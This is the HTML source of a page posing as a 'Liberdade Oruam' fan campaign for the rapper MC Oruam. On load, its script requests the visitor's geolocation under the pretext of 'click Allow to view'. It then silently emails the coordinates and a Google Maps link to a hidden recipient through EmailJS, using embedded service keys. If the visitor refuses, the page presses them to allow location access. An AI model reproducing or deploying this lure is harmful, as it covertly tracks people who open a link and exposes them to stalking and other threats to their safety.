<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <title>Campanha LIBERDADE ORUAM</title>
  <style>
    body {
      font-family: system-ui, sans-serif, Arial;
      text-align: center;
      padding: 20px;
      background-color: #121212;
      color: #fff;
    }
    img {
      max-width: 300px;
      margin: 20px auto;
      display: block;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
    }
    .message {
      font-size: 1.3em;
      margin-top: 20px;
    }
    a {
      color: #1db954;
      text-decoration: none;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <div id="content">
    <h1>üö® Clique em "Permitir" para visualizar</h1>
    <img src="https://aloalobahia.com/wp-content/uploads/2025/06/oruam-e1748886266821.jpg" alt="Mc Oruam" />
  </div>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    emailjs.init("90mR73F6qLxhPODK9"); // Public Key do EmailJS

    const contentDiv = document.getElementById('content');

    function showSuccess() {
      contentDiv.innerHTML = `
        <h1>‚úÖ Obrigado pela visita!</h1>
        <img src="https://i.imgur.com/3XRkxLX.jpg" alt="Obrigado Mc Oruam" />
        <p><a href="https://www.youtube.com/watch?v=NIZcHrgB7qo&list=RDNIZcHrgB7qo&start_radio=1" target="_blank">Ou√ßa agora o Mc Oruam</a></p>
      `;
    }

    function showError() {
      contentDiv.innerHTML = `
        <h1>‚ùå Oops, algo deu errado.</h1>
        <img src="https://i.imgur.com/N7t91MJ.jpg" alt="Erro Mc Oruam" />
        <p>Tente novamente e permita o acesso √† localiza√ß√£o.</p>
      `;
    }

    function enviarEmail(lat, lon) {
      const templateParams = {
        latitude: lat,
        longitude: lon,
        link_google_maps: `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`
      };

      emailjs.send("service_kc6xk8y", "template_jt9au2d", templateParams)
        .then(function(response) {
          showSuccess();
        }, function(error) {
          console.error(error);
          showError();
        });
    }

    function obterLocalizacao() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            enviarEmail(lat, lon);
          },
          (error) => {
            showError();
          }
        );
      } else {
        showError();
      }
    }

    obterLocalizacao();
  </script>

</body>
</html>
